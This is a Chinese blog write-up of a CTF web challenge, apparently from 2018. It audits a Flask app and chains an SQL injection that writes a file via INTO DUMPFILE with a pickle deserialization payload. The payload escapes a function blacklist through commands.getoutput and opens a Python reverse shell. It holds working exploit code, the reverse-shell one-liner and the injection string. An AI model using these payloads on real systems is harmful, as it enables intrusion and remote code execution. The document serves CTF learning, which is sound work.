+<h1 id="Python-is-the-best-language-2"><a href="#Python-is-the-best-language-2" class="headerlink" title="Python is the best language 2"></a>Python is the best language 2</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>接着进行代码审计。在<code>others.py</code>的最后有这样的内容：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">black_type_list = [eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen,</div><div class="line">                   tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link,</div><div class="line">                   lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs,</div><div class="line">                   rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv,</div><div class="line">                   execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe,</div><div class="line">                   spawnv, spawnve, spawnvp, spawnvpe, load, loads]</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterException</span><span class="params">(Exception)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span></div><div class="line">        super(FilterException, self).__init__(</div><div class="line">            <span class="string">'the callable object &#123;value&#125; is not allowed'</span>.format(value=str(value)))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_call</span><span class="params">(func)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">        <span class="keyword">print</span> args[<span class="number">0</span>].stack</div><div class="line">        <span class="keyword">if</span> args[<span class="number">0</span>].stack[<span class="number">-2</span>] <span class="keyword">in</span> black_type_list:</div><div class="line">            <span class="keyword">raise</span> FilterException(args[<span class="number">0</span>].stack[<span class="number">-2</span>])</div><div class="line">        <span class="keyword">return</span> func(*args, **kwargs)</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(file)</span>:</span></div><div class="line">    unpkler = Unpkler(file)</div><div class="line">    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</div><div class="line">    <span class="keyword">return</span> Unpkler(file).load()</div></pre></td></tr></table></figure></p>
+<p>我把这部分内容分为两部分；反序列化漏洞以及基本的沙箱逃逸问题。</p>
+<p>先忽略<code>unpkler.dispatch[REDUCE]</code>这一行的内容。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Unpickler <span class="keyword">as</span> Unpkler</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(file)</span>:</span></div><div class="line">    unpkler = Unpkler(file)</div><div class="line">    <span class="comment"># unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</span></div><div class="line">    <span class="keyword">return</span> Unpkler(file).load()</div></pre></td></tr></table></figure>
+<p>这里对<code>file</code>进行了反序列化，因此如果<code>file</code>可控即可造成危险。</p>
+<p>用下面的脚本(exp4.py)进行序列化payload的生成：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Pickler <span class="keyword">as</span> Pkler</div><div class="line"><span class="keyword">import</span> commands</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> (os.system,(<span class="string">"whoami"</span>,))    </div><div class="line">evil = chybeta()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(file)</span>:</span></div><div class="line">	pkler = Pkler(file)</div><div class="line">	pkler.dump(evil)</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">"test"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</div><div class="line">	dump(f)</div></pre></td></tr></table></figure></p>
+<p>测试反序列化漏洞(exp5.py):<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Unpickler <span class="keyword">as</span> Unpkler</div><div class="line"><span class="keyword">from</span> io <span class="keyword">import</span> open <span class="keyword">as</span> Open </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">LOAD</span><span class="params">(file)</span>:</span></div><div class="line">    unpkler = Unpkler(file)</div><div class="line">    <span class="keyword">return</span> Unpkler(file).load()</div><div class="line"></div><div class="line"><span class="keyword">with</span> Open(<span class="string">"test"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</div><div class="line">	LOAD(f)</div></pre></td></tr></table></figure></p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210716-71472a80-302d-1.jpeg" alt="unseri.jpg"></p>
+<p>不过没那么简单，源码还设置了沙箱/黑名单来防止某些函数的执行，比如前面的os.system就被禁用了，我们修改exp5.py为进一步的测试：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> io <span class="keyword">import</span> open <span class="keyword">as</span> Open </div><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Unpickler <span class="keyword">as</span> Unpkler</div><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Pickler <span class="keyword">as</span> Pkler</div><div class="line"></div><div class="line">black_type_list = [eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen,</div><div class="line">                   tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link,</div><div class="line">                   lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs,</div><div class="line">                   rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv,</div><div class="line">                   execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe,</div><div class="line">                   spawnv, spawnve, spawnvp, spawnvpe, load, loads]</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterException</span><span class="params">(Exception)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span></div><div class="line">        super(FilterException, self).__init__(</div><div class="line">            <span class="string">'the callable object &#123;value&#125; is not allowed'</span>.format(value=str(value)))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_call</span><span class="params">(func)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">        <span class="keyword">print</span> args[<span class="number">0</span>].stack</div><div class="line">        <span class="keyword">if</span> args[<span class="number">0</span>].stack[<span class="number">-2</span>] <span class="keyword">in</span> black_type_list:</div><div class="line">            <span class="keyword">raise</span> FilterException(args[<span class="number">0</span>].stack[<span class="number">-2</span>])</div><div class="line">        <span class="keyword">return</span> func(*args, **kwargs)</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">LOAD</span><span class="params">(file)</span>:</span></div><div class="line">    unpkler = Unpkler(file)</div><div class="line">    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</div><div class="line">    <span class="keyword">return</span> Unpkler(file).load()</div><div class="line"></div><div class="line"><span class="keyword">with</span> Open(<span class="string">"test"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</div><div class="line">	LOAD(f)</div></pre></td></tr></table></figure></p>
+<p>此时如果简单地想通过前一步生成的test来执行系统命令，会报错。</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210703-699fb630-302d-1.jpeg" alt="notallow.jpg"></p>
+<p>考虑其他方法。python中除了os和sys模块有提供命令执行的函数外，还有其他第三方模块，比如commands模块：</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210611-4aa7837a-302d-1.jpeg" alt="commands.jpg"></p>
+<p>因此改写生成序列化文件的exp4.py如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Unpickler <span class="keyword">as</span> Unpkler</div><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Pickler <span class="keyword">as</span> Pkler</div><div class="line"><span class="keyword">import</span> commands</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> (commands.getoutput,(<span class="string">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span>,))    </div><div class="line">evil = chybeta()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(file)</span>:</span></div><div class="line">	pkler = Pkler(file)</div><div class="line">	pkler.dump(evil)</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">"test"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</div><div class="line">	dump(f)</div></pre></td></tr></table></figure></p>
+<p>同时为了进一步利用，我们尝试反弹shell。过程如下，先运行exp4.py生成新的test序列化文件，接着nc监听本地端口，接着运行exp5.py触发序列化漏洞并完成利用</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210651-62471a68-302d-1.jpeg" alt="local_shell.jpg"></p>
+<p>不过该怎么控制源代码中的<code>load(file)</code>的file呢？通过全局搜索关键字，在<code>Mycache.py</code>的<code>FileSystemCache类</code>中有多次引用，比如定义在第137行的get方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, key)</span>:</span></div><div class="line">        filename = self._get_filename(key)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">                pickle_time = load(f)</div><div class="line">                <span class="keyword">if</span> pickle_time == <span class="number">0</span> <span class="keyword">or</span> pickle_time &gt;= time():</div><div class="line">                    a = load(f)</div><div class="line">                    <span class="keyword">return</span> a</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    os.remove(filename)</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">except</span> (IOError, OSError, PickleError):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">```            </div><div class="line">跟入`_get_filename`方法：</div><div class="line">```python</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_filename</span><span class="params">(self, key)</span>:</span></div><div class="line">    <span class="keyword">if</span> isinstance(key, text_type):</div><div class="line">        key = key.encode(<span class="string">'utf-8'</span>)  <span class="comment"># XXX unicode review</span></div><div class="line">    hash = md5(key).hexdigest()</div><div class="line">    <span class="keyword">return</span> os.path.join(self._path, hash)</div></pre></td></tr></table></figure></p>
+<p>可以看到将传入的字符串key进行MD5，并将其返回。不过这个<code>key</code>在哪里定义？通过全局搜索，不难发现在<code>Mysession.py</code>的<code>open_session</code>中进行了调用：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileSystemSessionInterface</span><span class="params">(SessionInterface)</span>:</span></div><div class="line">    ...</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, cache_dir, threshold, mode, key_prefix=<span class="string">"bdwsessions"</span>,</span></span></div><div class="line">                 use_signer=False, permanent=True):</div><div class="line"></div><div class="line">        self.cache = FileSystemCache(cache_dir, threshold=threshold, mode=mode)</div><div class="line">        self.key_prefix = key_prefix</div><div class="line">        self.use_signer = use_signer</div><div class="line">        self.permanent = permanent</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_session</span><span class="params">(self, app, request)</span>:</span></div><div class="line">        <span class="comment"># 从cookie中获取到sid</span></div><div class="line">        <span class="comment"># 格式 Cookie: session=675b6ec7-95bd-411f-a59d-4c3db5929604</span></div><div class="line">        <span class="comment"># sid 即为 675b6ec7-95bd-411f-a59d-4c3db5929604</span></div><div class="line">        sid = request.cookies.get(app.session_cookie_name)</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sid:</div><div class="line">            sid = self._generate_sid()</div><div class="line">            <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</div><div class="line">        ...</div><div class="line">        data = self.cache.get(self.key_prefix + sid)</div><div class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> self.session_class(data, sid=sid)</div><div class="line">        <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
+<p>其中<code>self.key_prefix</code>即为<code>bdwsessions</code>，因此假设cookie中的sesssion值为<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>，则<code>self.key_prefix + sid</code>即为<code>bdwsessions675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>，然后这串字符串进行MD5得到的结果<code>78f634977cbacf167dfd9656fe9dd5f3</code>即为<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>对应的session文件名。</p>
+<p>同时根据<code>config.py</code>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SQLALCHEMY_DATABASE_URI = <span class="string">"mysql://root:password@localhost/flask?charset=utf8"</span></div><div class="line">SESSION_FILE_DIR = <span class="string">"/tmp/ffff"</span></div></pre></td></tr></table></figure></p>
+<p>可以知道session文件的保存路径在<code>/tmp/ffff</code>，以及用户为root，因此具有文件导出的权限的可能性很大。</p>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>结合<code>Python is the best language 1</code>中的sql注入漏洞，我们梳理出如下的攻击流程：</p>
+<ol>
+<li>本地生成序列化文件，并且进行十六进制编码</li>
+<li>通过sql注入漏洞outfile出session文件</li>
+<li>访问index，同时带上session文件对应的session值，触发<code>open_session</code>中的<code>self.cache.get</code>，进行反序列化攻击</li>
+</ol>
+<p>假设前面生成的序列化文件存在于<code>/tmp/ffff/chybeta</code>，建议使用mysql的hex转码来进行十六进制的转换:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select hex(load_file('/tmp/ffff/chybeta')) into outfile '/tmp/ffff/exp';</div><div class="line">Query OK, 1 row affected (0.00 sec)</div></pre></td></tr></table></figure></p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210627-54001108-302d-1.jpeg" alt="exp.jpg"></p>
+<p>以使用<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>作为cookie为例，则其session文件存在于<code>/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3</code></p>
+<p>在十六进制的序列化串前面添加<code>0x</code>，构造邮箱处的注入点：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> email = <span class="string">'test'</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">0x63636F6D6D616E64730A</span>..<span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span><span class="keyword">dumpfile</span><span class="comment">/**/</span><span class="string">'/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3'</span>#@test.com<span class="string">'</span></div></pre></td></tr></table></figure></p>
+<p>也即在注册的邮箱处填入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test&apos;/**/union/**/select/**/0x63636F6D6D616E64730A.../**/into/**/dumpfile/**/&apos;/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3&apos;#@test.com</div></pre></td></tr></table></figure></p>
+<p>点击submit后出现<code>Please use a different email address.</code>。</p>
+<p>接着在burp中抓取访问index的包，并修改cookie为<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>，在自己的vps上监听对应的端口：</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210556-416f6304-302d-1.jpeg" alt="chybeta.jpg"></p>
+<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QWB&#123;pyth0n1s1ntere3t1ng&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>wtforms.validators的Email类验证不完善</li>
+<li>flask的session处理机制</li>
+<li>python沙箱逃逸</li>
+<li>python反序列化漏洞</li>
+<li>一点“小小”的脑洞</li>
+</ul>
+<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
+<li><a href="http://bugs.leavesongs.com/PYTHON/Python%E5%BA%93WTForm%E8%BF%87%E6%BB%A4%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4URLXSS%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">P师傅：Python库WTForm过滤不严导致URLXSS漏洞</a></li>
+</ul>
+
+      
+    </div>
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2018/03/25/Python-is-the-best-language-writeup/">Python is the best language-writeup</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
+  <p><span>发布时间:</span>2018年03月25日 - 19:03</p>
+  <p><span>最后更新:</span>2018年03月26日 - 18:03</p>
+  <p><span>原始链接:</span><a href="/2018/03/25/Python-is-the-best-language-writeup/" title="Python is the best language-writeup">http://chybeta.github.io/2018/03/25/Python-is-the-best-language-writeup/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chybeta.github.io/2018/03/25/Python-is-the-best-language-writeup/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+
+      
+	</div>
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/wechat.jpg?raw=true" alt="chybeta WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/flask/" rel="tag"># flask</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/21/某商城文件上传漏洞与SQL注入漏洞/" rel="next" title="某商城文件上传漏洞与SQL注入漏洞">
+                <i class="fa fa-chevron-left"></i> 某商城文件上传漏洞与SQL注入漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/3017/07/26/一些文章/" rel="prev" title="一些文章">
+                一些文章 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTAzNC81NjAz"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="chybeta" />
+          <p class="site-author-name" itemprop="name">chybeta</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">166</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">81</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/CHYbeta" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/chybeta" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://ph0en1x.com/" title="XMU-Ph0en1x" target="_blank">XMU-Ph0en1x</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://lxpark.com/" title="lzhtony" target="_blank">lzhtony</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.cnblogs.com/findneo/" title="findneo" target="_blank">findneo</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.madsome.cn" title="Mads" target="_blank">Mads</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://philhe.coding.me/" title="Philhe" target="_blank">Philhe</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Python-is-the-best-language-1"><span class="nav-number">2.</span> <span class="nav-text">Python is the best language 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Python-is-the-best-language-2"><span class="nav-number">3.</span> <span class="nav-text">Python is the best language 2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#流程"><span class="nav-number">3.2.</span> <span class="nav-text">流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Refference"><span class="nav-number">5.</span> <span class="nav-text">Refference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chybeta</span>
+</div>
+
+
+<div class="powered-by">
